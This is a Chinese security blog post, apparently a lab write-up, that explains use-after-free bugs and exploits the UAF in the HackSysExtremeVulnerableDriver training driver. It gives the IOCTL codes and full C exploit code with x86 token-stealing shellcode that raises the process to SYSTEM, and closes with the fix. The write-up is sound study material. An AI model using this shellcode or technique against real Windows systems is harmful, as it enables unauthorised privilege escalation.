<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GeIGkJhISkwLVJs1PGi-Kg)

0x01 UAF介绍
----------

看下面一段代码：

```
#include <iostream>  
  
int main()  
{  
    char* p1 = (char*)malloc(sizeof(char*)*10);  
    memcpy(p1,"hello",10);  
    printf("p1 addr:%x,p1:%s\n",p1,p1);  
    free(p1);  //释放堆空间  
  
    char* p2 = (char*)malloc(sizeof(char*) * 10);  
    memcpy(p2,"world",10);  
    printf("p2 addr:%x p1:%s\n",p2,p2);  
    printf("p1 addr:%x,p1:%s\n", p1, p1);  
}  

```

结果为：

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v66gOYBGC9tGnxribnFBldBDHPzffbgcYjSvia4FWyk4HYEibiaxO6XfPicLEtYavGbMHrdeKebkFw743A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

指针p1指向了一块大小为10字节的堆空间，并存入了一个字符串“hello”，随即释放了该堆空间，但并未将指针p1指向null，这将导致指针p1仍然能够使用。

紧接着指针p2指向了一块新申请为10字节的堆空间，并存入了一个字符串“world”，此时打印p1，p2的地址和字符串，发现p1和p2地址相同，并且此时能通过p1打印出“world”。

在free一块内存后，接着申请大小相同的一块内存，操作系统会将刚刚free掉的内存再次分配。

通过p2能够操作p1，如果之后p1继续被使用，则可以达到通过p2修改程序功能等目的，这也是UAF(use after free)的含义。

利用UAF漏洞，总结如下几个步骤:

1.  申请一块内存以后释放掉它，但是没有清空该内存的指针
    
2.  重新申请一块同样大小的内存，此时这两个指针对指向同一块内存
    
3.  对第一步的指针进行操作，它将会影响到第二步申请的指针指向的内存
    

0x02 定位漏洞点
----------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在释放了`g_UseAfterFreeObjectNonPagedPool`对应的堆空间后，并没有将该指针指向null。

导致后续如果有继续使用`g_UseAfterFreeObjectNonPagedPool`该全局变量，将会导致UAF漏洞。

该函数名称为`FreeUaFObjectNonPagedPool`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x03 相关函数
---------

查看`g_UseAfterFreeObjectNonPagedPool`的交叉引用，看还有那些函数使用了该全局变量。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

其中`AllocateUaFObjectNonPagedPool`的作用是申请一块内存

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`UseUaFObjectNonPagedPool`为执行`g_UseAfterFreeObjectNonPagedPool`指针

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`FreeUaFObjectNonPagedPool`负责释放堆空间

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

有了以上函数我们还需要重新申请一块相同大小的内存来控制`g_UseAfterFreeObjectNonPagedPool`

`AllocateFakeObjectNonPagedPoolIoCtrlHandler`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x04 漏洞分析
---------

### 申请空间

`AllocateUaFObjectNonPagedPool`函数向上跟，发现IOCTL为2236435时调用`AllocateUaFObjectNonPagedPoolIoctlHandler`函数

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

该函数直接调的就是`AllocateUaFObjectNonPagedPool`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

进入`AllocateUaFObjectNonPagedPool`后，可以看到通过`ExAllocatePoolWithTag`申请一个大小为0x58大小空间的内存，并将该内存返回的指针赋值给全局变量`g_UseAfterFreeObjectNonPagedPool`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

实际上0x58大小正好是一个结构体`_USE_AFTER_FREE_NON_PAGED_POOL`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 释放空间

向上跟踪`FreeUaFObjectNonPagedPool`,看谁调用了他

IOCTL为2236443时调用`FreeUaFObjectNonPagedPoolIoctlHandler`函数

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

同样`FreeUaFObjectNonPagedPoolIoctlHandler`仅仅调用了`FreeUaFObjectNonPagedPool`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过`ExFreePoolWithTag`释放`g_UseAfterFreeObjectNonPagedPool`指向的空间

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 数据载入

该函数IOCTL为2236511

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

将用户模式传入`UserFakeObject`指向内容拷贝给内核中申请的内存。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

注意这里申请的大小也是0x58，那么试想一种情景：

如果通过`AllocateUaFObjectNonPagedPool`申请了一块内存，并通过`FreeUaFObjectNonPagedPool`释放这块内存，但并没有将`g_UseAfterFreeObjectNonPagedPool`指针指向`null`，此时通过`AllocateFakeObjectNonPagedPoolNx`再次申请内存，那么`v1`就有可能重新指向一开始申请的内存，即`v1`和`g_UseAfterFreeObjectNonPagedPool`指向同一块内存，而此时`v1`可控，由三环`UserFakeObject`传入，那么此时如果有个函数可以执行`g_UseAfterFreeObjectNonPagedPool`则可造成UAF漏洞。

正好有这样一个函数`UseUaFObjectNonPagedPool`，能执行`g_UseAfterFreeObjectNonPagedPool`指针。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x05 构造exp
----------

```
#include <iostream>  
#include <Windows.h>  
  
typedef void(*FunctionPointer) ();  
  
typedef struct _FAKE_USE_AFTER_FREE  
{  
    FunctionPointer countinter;  
    char bufffer[0x54];  
}FAKE_USE_AFTER_FREE, * PUSE_AFTER_FREE;  
  
void ShellCode()  
{  
    _asm  
    {  
        nop  
        pushad  
        mov eax, fs: [124h]    
        mov eax, [eax + 0x50]     
        mov ecx, eax  
        mov edx, 4                
  
        find_sys_pid :  
        mov eax, [eax + 0xb8]     
        sub eax, 0xb8             
        cmp[eax + 0xb4], edx      
        jnz find_sys_pid  
  
        mov edx, [eax + 0xf8]  
        mov[ecx + 0xf8], edx  
        popad  
        ret  
    }  
}  
  
static VOID CreateCmd()  
{  
    STARTUPINFO si = { sizeof(si) };  
    PROCESS_INFORMATION pi = { 0 };  
    si.dwFlags = STARTF_USESHOWWINDOW;  
    si.wShowWindow = SW_SHOW;  
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };  
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);  
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);  
}  
  
  
int main()  
{  
    DWORD recvBuf;  
    // 获取句柄  
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",  
        GENERIC_READ | GENERIC_WRITE,  
        NULL,  
        NULL,  
        OPEN_EXISTING,  
        NULL,  
        NULL);  
  
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)  
    {  
        printf("获取句柄失败\n");  
        return 0;  
    }  
  
    DeviceIoControl(hDevice, 2236435, NULL, NULL, NULL, 0, &recvBuf, NULL);  
    DeviceIoControl(hDevice, 2236443, NULL, NULL, NULL, 0, &recvBuf, NULL);  
    PUSE_AFTER_FREE fakeG_UseAfterFree = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));  
    fakeG_UseAfterFree->countinter = ShellCode;  
    RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');  
  
  
    DeviceIoControl(hDevice, 2236511, fakeG_UseAfterFree, 0x60, NULL, 0, &recvBuf, NULL);  
    DeviceIoControl(hDevice, 2236439, NULL, NULL, NULL, 0, &recvBuf, NULL);  
  
    CreateCmd();  
    return 0;  
}  

```

为了能够保证`v1`和`g_UseAfterFreeObjectNonPagedPool`指向同一块内存，可以使用池喷射的方式。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x06 修复
-------

将`g_UseAfterFreeObjectNonPagedPool`在释放后指向null即可避免问题

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

加下方wx，拉你一起进群学习

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

SEH异常之编译器原理探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500921&idx=1&sn=0229a056fb1a180a2027cfed2f5fb37f&chksm=ce677ec5f910f7d3aab0dbaefdc105aa9b6cec72d149f4909b3cd6f1371eaee1e9fc5ba07203&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（三）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

[

初探栈溢出



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500720&idx=1&sn=b431f7b842f83ba769aa21b6f72a9874&chksm=ce67790cf910f01a10e45f7de48782e180acaf0a8440e02053cbfc82b8e15f00cc9534cf77fe&scene=21#wechat_redirect)

[

windows环境下的自保护探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500695&idx=1&sn=ba5ee681ab01b3e33b66d7562d8aaa19&chksm=ce67792bf910f03d5e828822de773c3c82f8f2fc38c2e875f17ffd01d06294ecbea5c618cc2f&scene=21#wechat_redirect)

[

记一次内部红队渗透——定位张三



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500656&idx=1&sn=654bbdcc1f6c5da944740c3519c3fc5a&chksm=ce6779ccf910f0daddbcbe77b77a0f44a2450dbd82f5e1c4269c311fe29858e76399ea625102&scene=21#wechat_redirect)

[

对抗无落地的shellcode注入



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500063&idx=1&sn=911e115c9c99ea88a582a947737a0cc1&chksm=ce677ba3f910f2b51cce3135c7fa709067498098e9d4b2de5f8df66f8760853d8ce8b74ea978&scene=21#wechat_redirect)

[

spring常见漏洞总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500014&idx=1&sn=7122283dde861deab7aba042ffe3b05f&chksm=ce677a52f910f3447af0e86ab4fc9e65324bc2f1de49032114480b92306a18a5c1c2661a422c&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

利用卷影拷贝服务提取ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 85篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)